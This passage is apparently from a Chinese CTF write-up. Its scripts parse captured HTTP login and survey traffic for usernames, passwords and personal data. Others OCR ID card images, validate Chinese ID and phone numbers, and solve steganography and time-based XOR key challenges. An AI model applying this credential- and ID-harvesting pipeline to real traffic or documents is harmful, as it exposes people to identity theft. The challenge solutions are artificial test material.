is_valid_bankcard(s: str) -> bool: """使用 Luhn 算法校验银行卡号是否有效。""" if not (16 <= len(s) <= 19 and s.isdigit()): return False digits = [int(d) for d in s] for i in range(len(digits) - 2, -1, -2): doubled = digits[i] * 2 digits[i] = doubled - 9 if doubled > 9 else doubled return sum(digits) % 10 == 0 def is_valid_ip(s: str) -> bool: """校验IPv4地址是否有效。""" parts = s.split('.') if len(parts) != 4: return False for part in parts: if not part.isdigit() or (len(part) > 1 and part.startswith('0')) or not 0 <= int(part) <= 255: return False return True def is_valid_mac(s: str) -> bool: """校验MAC地址是否有效。""" return re.fullmatch(r'([0-9a-fA-F]{2}:){5}([0-9a-fA-F]{2})', s, re.IGNORECASE) is not None def process_data_file(input_filename: str, output_filename: str): """ 主处理函数：读取整个文件内容，提取所有可能的候选数据，进行校验和分类。 """ try: with open(input_filename, 'r', encoding='utf-8') as f_in: content = f_in.read() except FileNotFoundError: print(f"错误：输入文件 '{input_filename}' 未找到。") return # ★★★ 专家级正则表达式，使用负向先行断言 (? '{os.path.basename(save_path)}' ({len(file_content)} bytes)") count += 1 except Exception as e: print(f"[{packet.number}] '{filename}' -> An error occurred while processing") continue cap.close() print(f"Processed {count} streams") if __name__ == '__main__': extract_files_from_pcap(PCAP_FILE, TARGET_URI, OUTPUT_DIR) ``` ![image16](./wp.assets/image16-1760238679953-70.png) 使用 OCR 识别图片中的身份证信息 ```python import easyocr import os import re import pandas as pd from tqdm import tqdm import shutil class IDCardExtractor: def __init__(self, images_dir='idcards/', fail_dir='fail/', use_gpu=True): print("Initializing EasyOCR (GPU)") try: self.reader = easyocr.Reader(['ch_sim', 'en'], gpu=use_gpu) if use_gpu: print("EasyOCR loaded") except Exception as e: print(f"Unable to initialize EasyOCR using GPU ({e})") print("Initializing EasyOCR (CPU)") self.reader = easyocr.Reader(['ch_sim', 'en'], gpu=False) print("EasyOCR loaded") self.images_dir = images_dir self.fail_dir = fail_dir os.makedirs(self.images_dir, exist_ok=True) os.makedirs(self.fail_dir, exist_ok=True) def extract_info_from_text(self, text): name = re.findall(r'姓名(.{2,4}?)性别', text) gender = re.findall(r'性别(.)民族', text) nation = re.findall(r'民族(.{1,3}?)出生', text) address = re.findall(r'住址(.*?)公民身份号码', text) number = re.findall(r'公民身份号码([0-9Xx]{18})', text) data = { '姓名': name[0] if name else '未识别', '性别': gender[0] if gender else '未识别', '民族': nation[0] if nation else '未识别', '地址': address[0].strip() if address else '未识别', '身份证号码': number[0] if number else '未识别' } return data def process_and_save_incrementally(self, output_path='result.csv'): image_files = [f for f in os.listdir(self.images_dir) if f.lower().endswith(('png', 'jpg', 'jpeg', 'bmp'))] write_header = not os.path.exists(output_path) print(f"len(image_files) files") total_processed = 0 fail_count = 0 for image_name in tqdm(image_files): image_path = os.path.join(self.images_dir, image_name) try: ocr_result = self.reader.readtext(image_path, detail=0) full_text = "".join(ocr_result).replace(" ", "") extracted_data = self.extract_info_from_text(full_text) if '未识别' in extracted_data.values(): tqdm.write(f"Unable to OCR '{image_name}'") dest_path = os.path.join(self.fail_dir, image_name) shutil.copy(image_path, dest_path) tqdm.write(f" -> Copied to '{self.fail_dir}'") fail_count += 1 continue df_single_row = pd.DataFrame([extracted_data]) df_single_row.to_csv( output_path, mode='a', header=write_header, index=False, encoding='utf-8-sig' ) write_header = False total_processed += 1 except Exception as e: tqdm.write(f"An error occurred ({e})") dest_path = os.path.join(self.fail_dir, image_name) shutil.copy(image_path, dest_path) tqdm.write(f" -> Copied to '{self.fail_dir}'") fail_count += 1 error_data = { '姓名': f'处理失败: {image_name}', '性别': 'N/A', '民族': 'N/A', '地址': 'N/A', '身份证号码': 'N/A' } df_error_row = pd.DataFrame([error_data]) df_error_row.to_csv( output_path, mode='a', header=write_header, index=False, encoding='utf-8-sig' ) write_header = False tqdm.write(f"Processed {total_processed} files") if fail_count > 0: tqdm.write(f"{fail_count} unexpected files copied to '{self.fail_dir}'") if __name__ == '__main__': extractor = IDCardExtractor(images_dir='idcards/', fail_dir='fail/', use_gpu=True) output_file = 'result.csv' extractor.process_and_save_incrementally(output_path=output_file) ``` 部分分辨率较低无法识别的，使用云平台证件 OCR ```python import requests import os import base64 import csv AUTH_URL = "https://aip.baidubce.com/oauth/2.0/token" BASE_URL = "https://aip.baidubce.com/rest/2.0/ocr/v1/idcard" SESSION = requests.session() INPUT_DIR = "fail" OUTPUT_DIR = "result_fail.csv" def login(key, secret): data = { "grant_type": "client_credentials", "client_id": key, "client_secret": secret } response = SESSION.post( url=AUTH_URL, data=data ).json() ak = response['access_token'] return ak if ak else False if __name__ == '__main__': ak = login('', '') if not ak: print('登录失败') exit(1) print(f"登录成功 ({ak})") f = open(OUTPUT_DIR, "a", newline='', encoding="utf-8") c = csv.writer(f) for root, dirs, files in os.walk(INPUT_DIR): for filename in files: file_path = os.path.join(root, filename) print(f"正在处理文件：{file_path}") with open(file_path, "rb") as f: content = f.read() content_base = base64.b64encode(content).decode('utf-8') data={ "image": content_base, "id_card_side": "front" } response = SESSION.post( url=BASE_URL, data=data, params={ "access_token": ak } ).json() name = response["words_result"]["姓名"]["words"] sex = response["words_result"]["性别"]["words"] nationality = response["words_result"]["民族"]["words"] address = response["words_result"]["住址"]["words"] idcard = response["words_result"]["公民身份号码"]["words"] c.writerow([ name, sex, nationality, address, idcard ]) f.close() ``` 识别完成后，合并 2 次识别的结果，并作数据清洗 ```python import pyshark import pandas as pd from tqdm import tqdm from urllib.parse import parse_qs, unquote import csv import binascii from datetime import datetime import subprocess PCAP_FILE = 'dataPic.pcapng' OCR_CSV_FILE = 'result.csv' OUTPUT_CSV_FILE = 'result_final.csv' TSHARK_PATH = r"D:\Wireshark\tshark.exe" PHONE_PREFIXES = { "134", "135", "136", "137", "138", "139", "147", "148", "150", "151", "152", "157", "158", "159", "172", "178", "182", "183", "184", "187", "188", "195", "198", "130", "131", "132", "140", "145", "146", "155", "156", "166", "167", "171", "175", "176", "185", "186", "196", "133", "149", "153", "173", "174", "177", "180", "181", "189", "190", "191", "193", "199" } ID_CARD_WEIGHTS = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] ID_CARD_CHECKSUM = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'] def is_valid_idcard(s: str) -> bool: cleaned_s = s.replace(" ", "").replace("-", "").upper() if len(cleaned_s) != 18: return False if not cleaned_s[:17].isdigit() or not (cleaned_s[17].isdigit() or cleaned_s[17] == 'X'): return False try: datetime.strptime(cleaned_s[6:14], '%Y%m%d') except ValueError: return False s_sum = sum(int(cleaned_s[i]) * ID_CARD_WEIGHTS[i] for i in range(17)) expected_checksum = ID_CARD_CHECKSUM[s_sum % 11] return cleaned_s[17] == expected_checksum def is_valid_phone(s: str) -> bool: temp_s = s.strip() if temp_s.startswith("+86"): temp_s = temp_s[3:].strip() elif temp_s.startswith("(+86)"): temp_s = temp_s[5:].strip() cleaned_s = temp_s.replace(" ", "").replace("-", "") return len(cleaned_s) == 11 and cleaned_s.isdigit() and cleaned_s[:3] in PHONE_PREFIXES def load_ocr_data(filepath): try: df = pd.read_csv(filepath) df.columns = df.columns.str.strip() id_card_map = pd.Series(df.idcard.values, index=df.name).to_dict() print(f"Loaded {len(id_card_map)} idcards") return id_card_map except Exception as e: print(f"An error occurred ({e})") return None def parse_http_form_data(form_data_str): try: parsed_data = parse_qs(form_data_str) return {k: unquote(v[0]) for k, v in parsed_data.items()} except Exception: return {} def process_pcap_performant(filepath, tshark_path): display_filter = 'http.request.method == "POST" && (http.request.uri == "/login.php" || http.request.uri == "/survey.php")' print(f"Fliter: {display_filter}") streams = {} try: count_cmd = [ tshark_path, '-r', filepath, '-Y', display_filter, '-T', 'fields', '-e', 'frame.number' ] proc = subprocess.run(count_cmd, capture_output=True, text=True, check=True) total_packets = len([line for line in proc.stdout.splitlines() if line]) print(f"Total {total_packets} packages") cap = pyshark.FileCapture( filepath, tshark_path=tshark_path, display_filter=display_filter, keep_packets=False ) for packet in tqdm(cap, total=total_packets): try: stream_index = int(packet.tcp.stream) if stream_index not in streams: streams[stream_index] = {} uri = packet.http.request_uri form_data_str = None if hasattr(packet.http, 'urlencoded_form'): form_data_str = packet.http.urlencoded_form.value elif hasattr(packet.http, 'file_data'): raw_body = binascii.unhexlify(packet.http.file_data.replace(':', '')) form_data_str = raw_body.decode('utf-8', errors='ignore') if not form_data_str: continue form_data = parse_http_form_data(form_data_str) if uri == '/login.php': streams[stream_index].update(form_data) elif uri == '/survey.php': if 'gender' in form_data: form_data['sex'] = form_data.pop('gender') if 'birth_date' in form_data: form_data['birth'] = form_data.pop('birth_date').replace('/', '') streams[stream_index].update(form_data) except Exception: continue extracted_data = [data for data in streams.values() if 'username' in data and 'name' in data] print(f"Total {len(extracted_data)} HTTP sessions") return extracted_data def validate_and_clean_data(records, id_card_map): print("Cleaning") valid_records = [] for record in tqdm(records): required_keys = ['username', 'password', 'name', 'sex', 'birth', 'phone'] if not all(key in record for key in required_keys): continue name = record.get('name') if name in id_card_map: record['idcard'] = str(id_card_map[name]) else: print(f"ID corresponding to the name '{name}' cannot be found, skip") continue phone, idcard = record['phone'], record['idcard'] if not is_valid_phone(phone): continue if not is_valid_idcard(idcard): continue birth_from_idcard = idcard[6:14] if record['birth'] != birth_from_idcard: continue sex_digit = int(idcard[16]) sex_from_idcard = '男' if sex_digit % 2 != 0 else '女' if record['sex'] != sex_from_idcard: continue valid_records.append(record) print(f"Cleaned. Total {len(valid_records)} valid data") return valid_records def write_to_csv(records, filepath): fieldnames = ['username', 'password', 'name', 'sex', 'birth', 'idcard', 'phone'] with open(filepath, 'w', newline='', encoding='utf-8') as csvfile: writer = csv.DictWriter(csvfile, fieldnames=fieldnames) writer.writeheader() for record in records: writer.writerow({key: record.get(key) for key in fieldnames}) if __name__ == "__main__": id_card_data = load_ocr_data(OCR_CSV_FILE) if id_card_data: extracted_records = process_pcap_performant(PCAP_FILE, TSHARK_PATH) final_valid_records = validate_and_clean_data(extracted_records, id_card_data) write_to_csv(final_valid_records, OUTPUT_CSV_FILE) print("OK") ``` ## misc ### 成功男人背后的女人 ![image34](./wp.assets/image34.png) 使用adobe fireworks 打开图片发先图片有多个图层 ![image35](./wp.assets/image35.png)隐藏下个一个图层之后出来一个图片，里面有很多男女标志 男为1 女为2提取出来，进行二进制解码就能getflag ![image36](./wp.assets/image36.png) ### 帅的被人砍 打开 Pcap，追踪 TCP 流 ![image17](./wp.assets/image17-1760238710181-75.png) 发现 7-Zip 压缩包特征，导出文件 编写脚本翻转文件 ```python input_file = "archive.7z" output_file = "fix.7z" with open(input_file, "rb") as f: data = f.read() reversed_data = data[::-1] with open(output_file, "wb") as f: f.write(reversed_data) ``` 解压 7z 文件 ![image20](./wp.assets/image20-1760238710181-76.png) 打开 解密器.c ![image21](./wp.assets/image21-1760238710181-77.png) 缺少 Key 检查 "hide.jpg"，发现 Steghide 隐写 ![image22](./wp.assets/image22-1760238710181-78.png) 提取 "key.txt" 文件 ``` PZNCKSLLLNWUMILYTNQSXCIDUNBHBDFV ``` 把 Key 填回 "解密器.c" ![image24](./wp.assets/image24-1760238710181-79.png) 运行后可以把 "动态KEY生成器.lock" 的 Data 段使用 AES 解密，还原成可执行文件 分析 "动态KEY生成器.lock"，发现是按照时间来生成 Key，题目描述中也有写 "小杜在2021年7月1日17时30分的时候使用动态密钥生成器，生成了一组KEY。而你怎样才能让FLAG生成器输出正确的flag呢。对了，他在使用动态密钥生成器的时候，被定位在了上海。"，即意为时区 Asia/Shanghai，UTC + 8 `time()` 函数默认返回的是秒级时间戳，但是题目只给到了分钟，说明有 60 种可能的 Key 再次查看 "flag生成器.exe" 对 Key 的校验逻辑 ![image25](./wp.assets/image25-1760238710181-80.png) 先对输入值进行变种凯撒解密，然后与预定义的明文的前 32 位进行比对，如果不符，则显示 Success 即输入的值的前 32 位应该是该预定值的加密 使用脚本生成 60 种可能的 Key，并使用 Key 的前 32 位的加密与预定义的值进行比对 ```python import datetime import pytz encrypted_data = bytes([ 0x5E, 0x55, 0x44, 0x42, 0x5C, 0x07, 0x04, 0x0D, 0x07, 0x51, 0x01, 0x0B, 0x42, 0x01, 0x0E, 0x00, 0x05, 0x58, 0x00, 0x4B, 0x46, 0x41, 0x45, 0x4C, 0x46, 0x4A, 0x52, 0x54, 0x5F, 0x5B, 0x5D, 0x01, 0x76, 0x76, 0x60, 0x75, 0x6D, 0x7D, 0x4A, 0x57, 0x5C, 0x49, 0x53, 0x09, 0x07, 0x07, 0x04, 0x55, 0x5E, 0x40, 0x41, 0x46, 0x40, 0x59, 0x53, 0x48, 0x02, 0x01, 0x09, 0x0E, 0x02, 0x50, 0x05, 0x4B ]) def encrypt(text): key = [3, 5, 2] key_len = len(key) encrypted = [] for i, ch in enumerate(text): if ch.isalpha(): base = ord('a') if ch.islower() else ord('A') shift = key[i % key_len] enc_ch = chr((ord(ch) - base + shift) % 26 + base) encrypted.append(enc_ch) else: encrypted.append(ch) return ''.join(encrypted) TARGET_PREFIX = encrypt("lzonc2550f12s3964f5spqornmzjfgg7") shanghai_tz = pytz.timezone('Asia/Shanghai') base_time = datetime.datetime(2021, 7, 1, 17, 30, 0) localized_base = shanghai_tz.localize(base_time) found = False for sec in range(60): t = localized_base.replace(second=sec) timestamp = int(t.timestamp()) ts_squared_str = str(timestamp * timestamp) key_chunk_str = ts_squared_str[-16:] key_chunk_bytes = key_chunk_str.encode('ascii') full_key = key_chunk_bytes * 4 decrypted_data = bytes([encrypted_data[i] ^ full_key[i] for i in range(64)]) try: flag = decrypted_data.decode('utf-8') except UnicodeDecodeError: continue if flag.startswith(TARGET_PREFIX): print(timestamp) found = True break ``` 运行后得到正确的时间戳是 "1625131826" 把正确的时间戳带入 "动态KEY生成器"，运行后得到 Key ```c #include #include #include unsigned char xor_key[64] = { 0x5E, 0x55, 0x44, 0x42, 0x5C, 0x07, 0x04, 0x0D, 0x07, 0x51, 0x01, 0x0B, 0x42, 0x01, 0x0E, 0x00, 0x05, 0x58, 0x00, 0x4B, 0x46, 0x41, 0x45, 0x4C, 0x46, 0x4A, 0x52, 0x54, 0x5F, 0x5B, 0x5D, 0x01, 0x76, 0x76, 0x60, 0x75, 0x6D, 0x7D, 0x4A, 0x57, 0x5C, 0x49, 0x53, 0x09, 0x07, 0x07, 0x04, 0x55, 0x5E, 0x40, 0x41, 0x46, 0x40, 0x59, 0x53, 0x48, 0x02, 0x01, 0x09, 0x0E, 0x02, 0x50, 0x05, 0x4B }; int main(int argc, char *argv[]) { int64_t timestamp = 1625131826; char timestamp_str[64]; int len; int64_t timestamp_squared = timestamp * timestamp; snprintf(timestamp_str, sizeof(timestamp_str), "%lld", timestamp_squared); len = strlen(timestamp_str); char key_material[16]; if (len > 15) { memcpy(key_material, timestamp_str + len - 16, 16); } else { int padding_size = 16 - len; memset(key_material, '0', padding_size); memcpy(key_material + padding_size, timestamp_str, len); } char repeated_key[64]; for (int i = 0; i < 4; ++i) { memcpy(repeated_key + (i * 16), key_material, 16); } printf("KEY>> "); for (int i = 0; i < 64; ++i) { putchar(repeated_key[i] ^ xor_key[i]); } return 0; } ``` ![PixPin_2025-10-12_10-33-49](./wp.assets/PixPin_2025-10-12_10-33-49.png) 把 Key 输入 "flag生成器.exe"，获得 Flag ![PixPin_2025-10-12_10-34-17](./wp.assets/PixPin_2025-10-12_10-34-17.png) 也可以用原始的 `decrypt()` 方法解密 ![image26](./wp.assets/image26-1760238775410-92.png)
